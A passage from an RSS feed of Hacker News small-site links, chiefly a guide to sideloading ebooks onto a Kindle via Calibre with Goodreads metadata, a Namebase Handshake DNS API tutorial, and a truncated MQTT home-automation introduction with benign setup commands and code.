<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="content">
<article>
<header>

</header>
<p><small><time datetime="2021-01-10T13:38:00+00:00">
      Sun 10 January 2021
    </time></small>
</p>
<div>
<p>I buy a lot of ebooks from Games Workshop's independent publishing arm, <a href="https://www.blacklibrary.com/">Black Library</a> and frequently find myself needing to load these ebooks onto my kindle. This can be quite a pain in the arse at times, particularly if you want the integration with Goodreads to work.</p>
<p>Thanks to a super helpful <a href="https://www.reddit.com/r/kindle/comments/3v8du1/sideloaded_books_cant_integrate_with_goodreads_on/cxltoja/">post on Reddit</a>, I found a useful method you can use to easily sideload books while also making sure they integrate properly with Goodreads.</p>
<p>For the sake of posterity here's the process you need to follow, with images.</p>
<h2>What You'll Need</h2>
<p>You'll need a few things before we get started.</p>
<ol>
<li>The ebook you want to transfer over to your device, in .epub format</li>
<li>A kindle, connected to your PC via USB</li>
<li><a href="https://calibre-ebook.com/">Calibre</a> installed on the same PC</li>
</ol>
<p>The first thing you'll want to do is launch Calibre and install a plugin called Quality Check. You can do this by navigating to <code>Preferences -&gt; Get plug-ins to enhance Calibre</code> and searching for "Quality Check" in the User Plug-ins window. Follow the instructions to install the plugin then restart Calibre.</p>
<p><a href="https://www.mobileread.com/forums/showthread.php?t=125428">Quality Check</a> will allow you to easily find and update metadata for your installed books, such as finding Amazon ASIN numbers and Goodreads ID's.</p>
<h2>How to do it</h2>
<p>Once you're setup and ready to go, the process is quite simple.</p>
<p>First, you'll want to add your books to Calibre. You can do this by dragging the files in or by clicking <code>Add books</code> in the navigation.</p>
<p><a href="https://www.jacquescorbytuech.com/images/post-images/Calibre-1.png"><img alt="Books added to Calibre" src="https://d33wubrfki0l68.cloudfront.net/37d37c4b0b86854abc11546ba76b9b7cd694cfe1/82f85/images/post-images/calibre-1.png"></a></p>
<p>Now your books have been added you'll see that they're missing lots of metadata. In the screenshot above I've just added Scions of the Emperor, Dawn of Fire and Sons of the Emperor.</p>
<p>Next, select the book(s) you want to convert and click <code>Convert books</code>. Make sure "Output format" is set to <strong>AZW3</strong>. You can do this individually or in bulk.</p>
<p><a href="https://www.jacquescorbytuech.com/images/post-images/Calibre-2.png"><img alt="Converting books to AWZ3" src="https://d33wubrfki0l68.cloudfront.net/c4ef876c43425998caa0b21d129671867105e17d/ed3e5/images/post-images/calibre-2.png"></a></p>
<p>Converting the books should take a few seconds per book but may take a while if you're converting a large library.</p>
<p>Now select the newly converted books and click <code>Edit metadata -&gt; Download metadata and covers</code>. Follow the instructions from there.</p>
<p>At this stage you may get an error informing you that metadata or covers failed to download, we'll have to fix this manually. Instructions for this can be found <a href="#if-an-error-occurs">at the bottom of this article</a>.</p>
<p>Once the books are converted, make sure they're still selected and click <code>Quality Check -&gt; Fix -&gt; Fix ASIN for Kindle Fire</code> in the navigation.</p>
<p>Almost there! All that's left is to select your books and send them to you Kindle. Ensure this is plugged in and set to USB Drive Mode, then select the book(s) you want to transfer and in the main navigation click <code>Send to device -&gt; Send specific format to -&gt; Main memory</code>. Select the AZW3 files and hit OK.</p>
<p><a href="https://www.jacquescorbytuech.com/images/post-images/Calibre-6.png"><img alt="Sending to Kindle" src="https://d33wubrfki0l68.cloudfront.net/c0545f15b1afcfaadd8b2858b52ae9fbbf4fa694/bf704/images/post-images/calibre-6.png"></a></p>
<p>The books should now be sent to your Kindle device.</p>
<p>You can now disconnect your Kindle and check the files are there. After you open a book, you should now also be able to use the Goodreads functionality built into the Goodreads device.</p>
<p>Enjoy your new book!</p>
<hr>
<h2>If an Error Occurs<a name="if-an-error-occurs"></a></h2>
<p><a href="https://www.jacquescorbytuech.com/images/post-images/Calibre-3.png"><img alt="Calibre metadata error" src="https://d33wubrfki0l68.cloudfront.net/e76e3ec621465a20da551a3f24b2823ceb450eca/dcf24/images/post-images/calibre-3.png"></a></p>
<p>If an error occurs when attempting to download metadata it's not the end of the world.</p>
<p>What you'll need to do is manually enter the ASIN, you can find this on the product page and in the URL of the product on an Amazon page.</p>
<p><a href="https://www.jacquescorbytuech.com/images/post-images/Amazon-ASIN.png"><img alt="Finding an Amazon ASIN" src="https://d33wubrfki0l68.cloudfront.net/e274fbb7ae6f12df4a8f2c8fcd5dca8fe3be6ecc/5f6b4/images/post-images/amazon-asin.png"></a></p>
<p>Copy this ID, return to Calibre, select your book again and click <code>Edit metadata -&gt; Edit metadata individually</code>. In the Ids form field, type "amazon:" followed by the ASIN. In my case this will look like <code>amazon:B07NY9GPYY</code>.</p>
<p><a href="https://www.jacquescorbytuech.com/images/post-images/Calibre-4.png"><img alt="Manually fixing metadata" src="https://d33wubrfki0l68.cloudfront.net/cd52f7123080da068a57a84857b0ecf45a256375/eb56c/images/post-images/calibre-4.png"></a></p>
<p>Hit OK and try again to download metadata.</p>
<p>If this fails again, you will need to also add the ISBN. This can be found on <a href="https://isbnsearch.org/">ISBN Search</a>. Edit the metadata again and add the ISBN-13 for your book to the Id's field.</p>
<p><a href="https://www.jacquescorbytuech.com/images/post-images/Calibre-5.png"><img alt="Adding an ISBN" src="https://d33wubrfki0l68.cloudfront.net/58d343ffd5ef48c34c005f89862e8f8e17dcd467/5e508/images/post-images/calibre-5.png"></a></p>
<p>Hit OK again and then try again to download metadata. This should now work. If it does, continue with the original instructions.</p>
<p>Cheers,</p>
<p><img alt="signature" src="https://www.jacquescorbytuech.com/images/jacques.png">
</p></div>
<div>
<h4>Subscribe for updates</h4>

<p>Updates, whenever I've got something valuable to say.</p>
</div>
</article>
</section></div>]]>
            </description>
            <link>https://www.jacquescorbytuech.com/writing/sideloading-books-kindle-goodreads-integration</link>
            <guid isPermaLink="false">hacker-news-small-sites-25715769</guid>
            <pubDate>Sun, 10 Jan 2021 15:43:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[FarmVille Once Took over Facebook. Now Everything Is FarmVille]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25715652">thread link</a>) | @FarmvilleCool
<br/>
January 10, 2021 | https://orangechew.com/s/okwxee/farmville_once_took_over_facebook_now | <a href="https://web.archive.org/web/*/https://orangechew.com/s/okwxee/farmville_once_took_over_facebook_now">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>
          via
        <a href="https://orangechew.com/u/ikigaibydesign">ikigaibydesign</a>

        <span title="2021-01-10 09:34:49 -0600">2 days ago</span>

        
          <span>
            |
            <a href="https://orangechew.com/s/okwxee/farmville_once_took_over_facebook_now">
              discuss</a>
          </span>

    </p></div></div>]]>
            </description>
            <link>https://orangechew.com/s/okwxee/farmville_once_took_over_facebook_now</link>
            <guid isPermaLink="false">hacker-news-small-sites-25715652</guid>
            <pubDate>Sun, 10 Jan 2021 15:35:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Greatest CPUs in Each Generation (x86)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25715573">thread link</a>) | @elvis70
<br/>
January 10, 2021 | http://dosdays.co.uk/topics/fastest_cpus.php | <a href="https://web.archive.org/web/*/http://dosdays.co.uk/topics/fastest_cpus.php">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>http://dosdays.co.uk/topics/fastest_cpus.php</link>
            <guid isPermaLink="false">hacker-news-small-sites-25715573</guid>
            <pubDate>Sun, 10 Jan 2021 15:30:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Handshake x Skynet tutorial: decentralized storage with decentralized naming]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25715406">thread link</a>) | @troquerre
<br/>
January 10, 2021 | https://www.namebase.io/blog/setting-dns-records | <a href="https://web.archive.org/web/*/https://www.namebase.io/blog/setting-dns-records">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="___gatsby"><div tabindex="-1" id="gatsby-focus-wrapper"><main><div><div><div><p>Aug 04, 2020 - updated</p><h2>How to use Handshake and Skynet together through the Namebase API</h2><p><a href="https://sia.tech/" target="_blank" rel="noopener noreferrer">Sia</a> and Namebase teams have partnered together for the "<a href="https://gitcoin.co/hackathon/own-the-internet/onboard" target="_blank" rel="noopener noreferrer">Own the Internet</a>" Hackathon — a 3-week hackathon from July 29th to Aug 19th to build decentralized applications that are censorship-resistant and truly in your control. There are more than $4000 SC and HNS in prizes, and <span>every</span> participant gets a free Handshake domain and an Own the Internet T-shirt! Registration is open until the end of the hackathon so <a href="https://gitcoin.co/hackathon/own-the-internet/onboard" target="_blank" rel="noopener noreferrer">start hacking now</a>!</p><p>You can access the code in the following blog through <a href="https://gist.github.com/johnnywu-namebase/8528bda43339ace9cc01de2cc5cbf828" target="_blank" rel="noopener noreferrer">this</a> Github Gist.</p><p>Do note you can still use the GUI DNS management in your Domain Manager if you don't want to use the API.</p><p><span>Get Namebase API key</span></p><p>Login to your Namebase account and go to <a href="https://namebase.io/pro/keys" target="_blank" rel="noopener noreferrer">https://namebase.io/pro/keys</a>.</p><p>Click "NEW API KEY" in the top right.</p><p>Record the Access Key and Secret Key.</p><p>To authenticate your API calls, you'll need to create an authentication header to send with the HTTP request. Here's what the steps look like in javascript:</p><p><img alt="" src="https://images.ctfassets.net/v3ez3dek3dk6/4uPHUbM487a5PdtDsa8cqK/18dfc3b5cf379d692dc260aa0cf71122/carbon.png?fit=pad&amp;w=720"></p><p>Then add "Authorization: authorization" as a header.</p><p>Here's a script that simplifies the HTTP requests into a command line interface. To set it up, set the "ACCESS_KEY" and "SECRET_KEY" with the keys you recorded earlier. The full documentation on the API can be found <a href="https://github.com/namebasehq/api-documentation" target="_blank" rel="noopener noreferrer">here</a>.</p><p><img alt="" src="https://images.ctfassets.net/v3ez3dek3dk6/MbGGUT0nCJUNaCjXk4UMa/356c2a388c41a68505185cd44e4bfdd6/carbon__1_.png?fit=pad&amp;w=720"></p><p><span>Using the Script</span></p><p>Now that your API calls are authenticated, you can test out the queries. The script call looks like:</p><p><img alt="" src="https://images.ctfassets.net/v3ez3dek3dk6/2JzZBcG9Ztas0TjBaKBJVG/abcd53320831e14f1798d499589b6810/carbon__2_.png?fit=pad&amp;w=720"></p><p>where</p><p>"METHOD" = "get" (retrieving records) or "put" (adding/updating records)</p><p>"SERVICE" = which DNS settings you want to add, the three options are: </p><ul><li><p>"blockchain" — for Handshake records that are 'DS', 'TXT', or 'NS'</p></li><li><p>"blockchain-advanced" — Handshake accepts some additional record types, in order to send these create a Handshake resource record and send the hex as the RECORD_DATA (more documentation can be found <a href="https://hsd-dev.org/guides/resource-records.html" target="_blank" rel="noopener noreferrer">here</a>)</p></li><li><p>"nameserver" — Namebase's own nameservers which enables users to set 'A', 'CNAME', 'ALIAS', 'NS', 'DS', and 'TXT' records either on the root or a subdomain. All names won on Namebase should have this connected by default. There's an explanation on how to check if this is configured below.</p></li></ul><p>"DOMAIN" = your Handshake domain</p><p>"RECORD_DATA" = only necessary for "METHOD"='put'; the json format varies slightly based on the "SERVICE", be sure to double check with the full documentation.</p><p>Keep in mind that the "blockchain" endpoints will replace all existing records with the new json that is sent. So, if you only want to add another record, you have to get the current records and send them along with the new one. For deleting, you would need to resend all the current records except for the one you want to delete.</p><p>The nameserver records are slightly different. It will only replace records if a record with the same type and host is specified. For example, if I have a "TXT" record set on "foo.example", adding another "TXT" record on "bar.example" will not replace it.</p><p>Now that you know the details of the API, let's run through some examples.</p><p><span>Connecting Namebase's Nameservers</span></p><p>Retrieve your name's Handshake records:</p><p><img alt="" src="https://images.ctfassets.net/v3ez3dek3dk6/5wfe5PMtnNcvK674eLXHhF/861b914b653cbbc685b028e9ba5f6345/carbon__3_.png?fit=pad&amp;w=720"></p><p>This calls the "GET /api/v0/dns/domains/YOUR_DOMAIN" endpoint.</p><p>If your response contains the following json in the "records" array, then the nameserver is connected:</p><p><img alt="" src="https://images.ctfassets.net/v3ez3dek3dk6/2S1gRwTWLHakWH8mjaeSrO/b975d2e027bd65438ab61f3b2720d39c/carbon__5_.png?fit=pad&amp;w=720"></p><p>If it's not, run the following command to set the record:</p><p><img alt="" src="https://images.ctfassets.net/v3ez3dek3dk6/5bi36FzXF4Nix39CHqleQb/c61726aef5aafe5b7032e74189604ff8/carbon__6_.png?fit=pad&amp;w=720"></p><p>This calls the "PUT /api/v0/dns/domains/YOUR_DOMAIN" endpoint.</p><p>You'll have to wait until the update gets mined before it's ready to use. If you're not sure, run the command to retrieve the Handshake records again. The "upToDate" value will indicate if Handshake has updated.</p><p><span>Connecting to Skynet</span></p><p>For an extended tutorial on setting up a site hosted on Sia's Skynet and connecting it to Handshake via their Skynet Portal, their <a href="https://blog.sia.tech/skynet-handshake-d5d16e6b632f" target="_blank" rel="noopener noreferrer">Skynet 🤝 Handshake</a> blog post is extremely helpful. Ivaylo explains how to send your content to the decentralized cloud and how to set your Handshake DNS records through Namebase's UI in order to access your content through the portal. The following is how you would set those records through the Namebase API.</p><p>For setting up the Skynet Portal, all you'll need is to set a "TXT" record with the skylink for your app. Here's what the call should look like:</p><p><img alt="" src="https://images.ctfassets.net/v3ez3dek3dk6/7djhR8x81Kl2Hx7GL1L8jD/0983ecf4e3ea9c823a1c1e783248d1c2/carbon__7_.png?fit=pad&amp;w=720"></p><p><span>Other Examples</span></p><p>Update blockchain Skylink</p><p><img alt="" src="https://images.ctfassets.net/v3ez3dek3dk6/2NANspIYVnVWl3uZlcL6Ni/38460e9cb39695168310444833059b07/carbon__8_.png?fit=pad&amp;w=720"></p><p>Delete all "TXT" records on "foo.example"</p><p><img alt="" src="https://images.ctfassets.net/v3ez3dek3dk6/5S7IUbSfxBTLzC6FiMipHK/c22d4f5aa1779fd9c193dc8ee199183f/carbon__9_.png?fit=pad&amp;w=720"></p><a href="#"></a></div></div></div></main></div></div></div>]]>
            </description>
            <link>https://www.namebase.io/blog/setting-dns-records</link>
            <guid isPermaLink="false">hacker-news-small-sites-25715406</guid>
            <pubDate>Sun, 10 Jan 2021 15:16:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A quick introduction to MQTT for IoT]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25715329">thread link</a>) | @secure
<br/>
January 10, 2021 | https://michael.stapelberg.ch/posts/2021-01-10-mqtt-introduction/ | <a href="https://web.archive.org/web/*/https://michael.stapelberg.ch/posts/2021-01-10-mqtt-introduction/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
  
  <details>
    <summary>Table of contents</summary>
    <nav>
<ul>
<li>
<ul>
<li><a href="#motivation">Motivation</a></li>
<li><a href="#step-1-set-up-an-mqtt-broker-server">Step 1. Set up an MQTT broker (server)</a>
<ul>
<li><a href="#mqtt-broker-setup-displaying-sending-test-messages">MQTT broker setup: displaying/sending test messages</a></li>
</ul></li>
<li><a href="#step-2-integrate-with-mqtt">Step 2. Integrate with MQTT</a>
<ul>
<li><a href="#best-practices-for-your-own-structure">Best practices for your own structure</a></li>
<li><a href="#integration-shelly-devices-with-mqtt-built-in">Integration: Shelly devices with MQTT built-in</a></li>
<li><a href="#integration-zigbee2mqtt-for-zigbee-devices">Integration: Zigbee2MQTT for Zigbee devices</a></li>
<li><a href="#integration-esphome-for-micro-controllers-sensors">Integration: ESPHome for micro controllers + sensors</a></li>
<li><a href="#integration-mongoose-os-for-micro-controllers">Integration: Mongoose OS for micro controllers</a></li>
<li><a href="#integration-arduino-for-custom-micro-controller-firmware">Integration: Arduino for custom micro controller firmware</a></li>
</ul></li>
<li><a href="#integration-webhook-to-mqtt">Integration: Webhook to MQTT</a></li>
<li><a href="#step-3-express-your-logic">Step 3. Express your logic</a>
<ul>
<li><a href="#regelwerk-control-loops-definition">regelwerk: control loops definition</a></li>
<li><a href="#regelwerk-mqtt-dispatcher">regelwerk: MQTT dispatcher</a></li>
<li><a href="#regelwerk-control-loop-example">regelwerk: control loop example</a></li>
</ul></li>
<li><a href="#conclusion">Conclusion</a></li>
</ul></li>
</ul>
</nav>
  </details>
  

<p>While I had heard the abbreviation <a href="https://en.wikipedia.org/wiki/MQTT">MQTT</a>
many times, I never had a closer look at what MQTT is.</p>

<p>Here are a few quick notes about using MQTT as <a href="https://en.wikipedia.org/wiki/Publish%E2%80%93subscribe_pattern">Pub/Sub
bus</a> in a home
IOT network.</p>

<h2 id="motivation">Motivation</h2>

<p>Once you have a few <a href="https://en.wikipedia.org/wiki/Internet_of_things">IOT
devices</a>, an obvious question
is how to network them.</p>

<p>If all your devices are from the same vendor, the vendor takes care of it.</p>

<p>In my home, I have many different vendors/devices, such as (incomplete list):</p>

<ul>
<li><a href="https://nuki.io/en/opener/">Nuki Opener</a> Smart Intercom</li>
<li><a href="https://www.itead.cc/sonoff-s26-wifi-smart-plug.html">Sonoff S26 Smart Plug</a> (WiFi-controlled socket outlet)</li>
<li><a href="https://www.aqara.com/en/door_and_window_sensor.html">Aqara Door &amp; Window Sensors</a></li>
<li><a href="https://en.wikipedia.org/wiki/IKEA#Smart_home">IKEA Home Smart</a> (formerly TRÅDFRI) Smart Lights</li>
</ul>

<p>Here is how I combine these devices:</p>

<ul>
<li>When I’m close to my home (geo-fencing), the Nuki Opener enables Ring To Open (RTO): when I ring the door bell, it opens the door for me.</li>
<li>When I open the apartment door, the Smart Lights in the hallway turn on.</li>
<li>When I’m home, my stereo speakers should be powered on so I can play music.</li>
</ul>

<p>A conceptually simple way to hook this up is to connect things directly: listen
to the Aqara Door Sensor and instruct the Smart Lights to turn on, for example.</p>

<p>But, connecting everything to an MQTT bus has a couple of advantages:</p>

<ol>
<li>Unification: everything is visible in one place, the same tools work for all
devices.</li>
<li>Your custom logic is uncoupled from vendor details: you can receive and send
MQTT.</li>
<li>Compatibility with existing software, such as <a href="https://www.home-assistant.io/">Home
Assistant</a> or
<a href="https://www.openhab.org/">openHAB</a></li>
</ol>

<h2 id="step-1-set-up-an-mqtt-broker-server">Step 1. Set up an MQTT broker (server)</h2>

<p>A broker is what relays messages between publishers and subscribers. As an
optimization, the most recent value of a topic can be retained, so that e.g. a
subscriber does not need to wait for the next change to obtain the current
state.</p>

<p>The most popular choice for broker software seems to be
<a href="https://mosquitto.org/">Mosquitto</a>, but since I like to run Go software on
<a href="https://gokrazy.org/">https://gokrazy.org/</a>, I kept looking and found <a href="https://github.com/fhmq/hmq">https://github.com/fhmq/hmq</a>.</p>

<p>One downside of <code>hmq</code> might be that it does not seem to support persisting
retained messages to disk. I’ll treat this as a feature for the time being,
enforcing a fresh start on every daily reboot.</p>

<p>To restrict hmq to only listen in my local network, I’m using <a href="https://github.com/gokrazy/tools/commit/fdd90fc6817876e08b352fae84f2a2794524ccc0">gokrazy’s flag
file
feature</a>:</p>

<pre><code>mkdir -p flags/github.com/fhmq/hmq
echo --host=10.0.0.217 &gt; flags/github.com/fhmq/hmq/flags.txt
</code></pre>

<p>Note that you’ll need <a href="https://github.com/fhmq/hmq/pull/105">https://github.com/fhmq/hmq/pull/105</a> in case your network
does not come up quickly.</p>

<h3 id="mqtt-broker-setup-displaying-sending-test-messages">MQTT broker setup: displaying/sending test messages</h3>

<p>To display all messages going through your MQTT broker, subscribe using the
<a href="https://mosquitto.org/">Mosquitto</a> tools:</p>

<pre><code>% sudo pacman -S mosquitto
% mosquitto_sub --id "${HOST}_all" --host dr.lan --topic '#' --verbose
</code></pre>

<p>The <code>#</code> sign denotes an <a href="https://subscription.packtpub.com/book/application_development/9781787287815/1/ch01lvl1sec18/understanding-wildcards">MQTT
wildcard</a>,
meaning subscribe to all topics in this case.</p>

<p>Be sure to set a unique id for each <code>mosquitto_sub</code> command you run, so that you
can see which subscribers are connected to your MQTT bus. Avoid id clashes,
otherwise the subscribers will disconnect each other!</p>

<p>Now, when you send a test message, you should see it:</p>

<pre><code>% mosquitto_pub --host dr.lan --topic 'cmnd/tasmota_68462F/Power' -m 'ON'
</code></pre>

<p>Tip: If you have binary data on your MQTT bus, you can display it in hex with
timestamps:</p>

<pre><code>% mosquitto_sub \
  --id "${HOST}_bell" \
  --host dr.lan \
  --topic 'doorbell/#' \
  -F '@<a href="https://michael.stapelberg.ch/cdn-cgi/l/email-protection" data-cfemail="d188fc91bcfc">[email&nbsp;protected]</a>@<a href="https://michael.stapelberg.ch/cdn-cgi/l/email-protection" data-cfemail="7a1e2e3a32">[email&nbsp;protected]</a>:@M:@<a href="https://michael.stapelberg.ch/cdn-cgi/l/email-protection" data-cfemail="eab9aa90">[email&nbsp;protected]</a> : %t : %x'
</code></pre>

<h2 id="step-2-integrate-with-mqtt">Step 2. Integrate with MQTT</h2>

<p>Now that communication via the bus works, what messages do we publish on which
topics?</p>

<p>MQTT only defines that topics are hierarchical; messages are arbitrary byte
sequences.</p>

<p>There are a few popular conventions for what to put onto MQTT:</p>

<ul>
<li><p><a href="https://homieiot.github.io/">The Homie convention</a></p></li>

<li><p>Home Assistant has its own convention, but <a href="https://www.home-assistant.io/integrations/switch.mqtt/#full-configuration">allows full configuration</a>. Home Assistant does <a href="https://community.home-assistant.io/t/home-assistant-homie-compatibility/17135/8">not support the homie convention yet</a>.</p></li>

<li><p>openHAB <a href="https://www.openhab.org/addons/bindings/mqtt.generic/">refers to Home Assistant and
Homie</a>.</p></li>
</ul>

<p>If you design everything yourself, Homie seems like a good option. If you plan to
use Home Assistant or similar, stick to the Home Assistant convention.</p>

<h3 id="best-practices-for-your-own-structure">Best practices for your own structure</h3>

<p>In case you want/need to define your own topics, keep these tips in mind:</p>

<ul>
<li>devices publish their state on a single, retained topic

<ul>
<li>the topic name could be e.g. <code>stat/tasmota_68462F/POWER</code></li>
<li>retaining the topic allows consumers to catch up after (re-)connecting to the bus</li>
</ul></li>
<li>publish commands on a single, possibly-retained topic

<ul>
<li>e.g. publish <code>ON</code> to topic <code>cmnd/tasmota_68462F/Power</code></li>
<li>publish the desired state: publish <code>ON</code> or <code>OFF</code> instead of <code>TOGGLE</code></li>
<li>if you retain the topic and publish <code>TOGGLE</code> commands, your lights will mysteriously go off/on when they unexpectedly re-establish their MQTT connection</li>
</ul></li>
</ul>

<h3 id="integration-shelly-devices-with-mqtt-built-in">Integration: Shelly devices with MQTT built-in</h3>

<p><a href="https://shelly.cloud/">Shelly</a> has a number of smart devices that come with
MQTT out of the box! This sounds like the easiest solution if you’re starting
from scratch.</p>

<p>I haven’t used these devices personally, but I hear good things about them.</p>

<h3 id="integration-zigbee2mqtt-for-zigbee-devices">Integration: Zigbee2MQTT for Zigbee devices</h3>

<p><a href="https://www.zigbee2mqtt.io/">Zigbee2MQTT</a> supports well <a href="https://www.zigbee2mqtt.io/information/supported_devices.html">over 1000 Zigbee
devices</a> and
exposes them on the MQTT bus.</p>

<p>For example, this is what you would use to connect your IKEA TRÅDFRI Smart
Lights to MQTT.</p>

<h3 id="integration-esphome-for-micro-controllers-sensors">Integration: ESPHome for micro controllers + sensors</h3>

<p>The <a href="https://esphome.io/">ESPHome</a> system is a ready-made solution to connect a
wide array of sensors and devices to your home network via MQTT.</p>

<p>If you want to use your own ESP-based micro controllers and sensors, this seems
like the easiest way to get them programmed.</p>

<h3 id="integration-mongoose-os-for-micro-controllers">Integration: Mongoose OS for micro controllers</h3>

<p>Mongoose OS is an IOT firmware development framework, taking care of device
management, Over-The-Air updates, and more.</p>

<p><a href="https://mongoose-os.com/docs/mongoose-os/cloud/mqtt.md">Mongoose comes with MQTT
support</a>, and with just
a few lines you can build, flash and configure your device. Here’s an example
for the NodeMCU (ESP8266-based):</p>

<pre><code>% yay -S mos-bin
% mos clone https://github.com/mongoose-os-apps/demo-js app1
% cd app1
% mos --platform esp8266 build
% mos --platform esp8266 --port /dev/ttyUSB1 flash
% mos --port /dev/ttyUSB1 config-set mqtt.enable=true mqtt.server=dr.lan:1883
</code></pre>

<p>Pressing the button on the NodeMCU publishes a message to MQTT:</p>

<pre><code>% mosquitto_sub --host dr.lan --topic devices/esp8266_F4B37C/events
{"ram_free":31260,"uptime":27.168680,"btnCount":2,"on":false}
</code></pre>

<h3 id="integration-arduino-for-custom-micro-controller-firmware">Integration: Arduino for custom micro controller firmware</h3>

<p>Arduino has an <a href="https://www.arduino.cc/reference/en/libraries/mqtt-client/">MQTT Client
library</a>. If your
microcontroller is networked, e.g. an ESP32 with WiFi, you can publish MQTT
messages from your Arduino sketch:</p>
<div><pre><code data-lang="c"><span>#include</span> <span>&lt;WiFi.h&gt;</span><span>
</span><span>#include</span> <span>&lt;PubSubClient.h&gt;</span><span>
</span><span></span>
WiFiClient wificlient;
PubSubClient <span>client</span>(wificlient);

<span>void</span> <span>callback</span>(<span>char</span><span>*</span> topic, byte<span>*</span> payload, <span>unsigned</span> <span>int</span> length) {
    Serial.print(<span>"Message arrived ["</span>);
    Serial.print(topic);
    Serial.print(<span>"] "</span>);
    <span>for</span> (<span>int</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> length; i<span>++</span>) {
      Serial.print((<span>char</span>)payload[i]);
    }
    Serial.println();
  
    <span>if</span> (strcmp(topic, <span>"doorbell/cmd/unlock"</span>) <span>==</span> <span>0</span>) {
  		<span>// …
</span><span></span>    }
}

<span>void</span> <span>taskmqtt</span>(<span>void</span> <span>*</span>pvParameters) {
	<span>for</span> (;;) {
		<span>if</span> (<span>!</span>client.connected()) {
			client.connect(<span>"doorbell"</span> <span>/* clientid */</span>);
			client.subscribe(<span>"doorbell/cmd/unlock"</span>);
		}

		<span>// Poll PubSubClient for new messages and invoke the callback.
</span><span></span>		<span>// Should be called as infrequent as one is willing to delay
</span><span></span>		<span>// reacting to MQTT messages.
</span><span></span>		<span>// Should not be called too frequently to avoid strain on
</span><span></span>		<span>// the network hardware:
</span><span></span>		<span>// https://github.com/knolleary/pubsubclient/issues/756#issuecomment-654335096
</span><span></span>		client.loop();
		vTaskDelay(pdMS_TO_TICKS(<span>100</span>));
	}
}

<span>void</span> <span>setup</span>() {
	connectToWiFi(); <span>// WiFi configuration omitted for brevity
</span><span></span>
	client.setServer(<span>"dr.lan"</span>, <span>1883</span>);
	client.setCallback(callback);

	xTaskCreatePinnedToCore(taskmqtt, <span>"MQTT"</span>, <span>2048</span>, <span>NULL</span>, <span>1</span>, <span>NULL</span>, PRO_CPU_NUM);
}

<span>void</span> <span>processEvent</span>(<span>void</span> <span>*</span>buf, <span>int</span> telegramLen) {
	client.publish(<span>"doorbell/events/scs"</span>, buf, telegramLen);
}</code></pre></div>
<h2 id="integration-webhook-to-mqtt">Integration: Webhook to MQTT</h2>

<p>The Nuki Opener doesn’t support MQTT out of the box, but the Nuki Bridge can
send Webhook requests. In a few lines of Go, you can forward what the Nuki
Bridge sends to MQTT:</p>
<div><pre><code data-lang="go"><span>package</span> main

<span>import</span> (
	<span>"fmt"</span>
	<span>"io/ioutil"</span>
	<span>"log"</span>
	<span>"net/http"</span>

	mqtt <span>"github.com/eclipse/paho.mqtt.golang"</span>
)

<span>func</span> <span>nukiBridge</span>() <span>error</span> {
	opts <span>:=</span> mqtt.<span>NewClientOptions</span>().<span>AddBroker</span>(<span>"tcp://dr.lan:1883"</span>)
	opts.<span>SetClientID</span>(<span>"nuki2mqtt"</span>)
	opts.<span>SetConnectRetry</span>(<span>true</span>)
	mqttClient <span>:=</span> mqtt.<span>NewClient</span>(opts)
	<span>if</span> token <span>:=</span> mqttClient.<span>Connect</span>(); token.<span>Wait</span>() <span>&amp;&amp;</span> token.<span>Error</span>() <span>!=</span> <span>nil</span> {
		<span>return</span> fmt.<span>Errorf</span>(<span>"MQTT connection failed: %v"</span>, token.<span>Error</span>())
	}

	mux <span>:=</span> http.<span>NewServeMux</span>()
	mux.<span>HandleFunc</span>(<span>"/nuki"</span>, <span>func</span>(w http.ResponseWriter, r <span>*</span>http.Request) {
		b, err <span>:=</span> ioutil.<span>ReadAll</span>(r.Body)
		<span>if</span> err <span>!=</span> <span>nil</span> {
			log.<span>Print</span>(err)
			http.<span>Error</span>(w, err.<span>Error</span>(), http.StatusInternalServerError)
			<span>return</span>
		}

		mqttClient.<span>Publish</span>(
			<span>"zkj-nuki/webhook"</span>, <span>// topic
</span><span></span>			<span>0</span>, <span>// qos
</span><span></span>			<span>true</span>, <span>// retained
</span><span></span>			<span>string</span>(b)) <span>// payload
</span><span></span>	})

	<span>return</span> http.<span>ListenAndServe</span>(<span>":8319"</span>, mux)
}

<span>func</span> <span>main</span>() {
	<span>if</span> err <span>:=</span> <span>nukiBridge</span>(); err <span>!=</span> <span>nil</span> {
		log.<span>Fatal</span>(err)
	}
}</code></pre></div>
<p>See <a href="https://developer.nuki.io/t/bridge-http-api/26">Nuki’s Bridge HTTP-API</a>
document for details on how to configure your bridge to send webhook callbacks.</p>

<h2 id="step-3-express-your-logic">Step 3. Express your logic</h2>

<p><a href="https://www.home-assistant.io/">Home Assistant</a> and
<a href="https://nodered.org/">Node-RED</a> are both popular options, but also large
software packages.</p>

<p>Personally, I find it more fun to express my logic directly in a full
programming language (Go).</p>

<p>I call the <a href="https://github.com/stapelberg/regelwerk">resulting program <code>regelwerk</code> (“collection of
rules”)</a>. The program consists of:</p>

<ol>
<li>various control loops that progress independently from each other</li>
<li>an MQTT message dispatcher feeding these control loops</li>
<li>a debugging web interface to visualize state</li>
</ol>

<p>This architecture is by no means a new approach: as
<a href="https://github.com/rs/moquette">moquette</a> describes it, this …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://michael.stapelberg.ch/posts/2021-01-10-mqtt-introduction/">https://michael.stapelberg.ch/posts/2021-01-10-mqtt-introduction/</a></em></p>]]>
            </description>
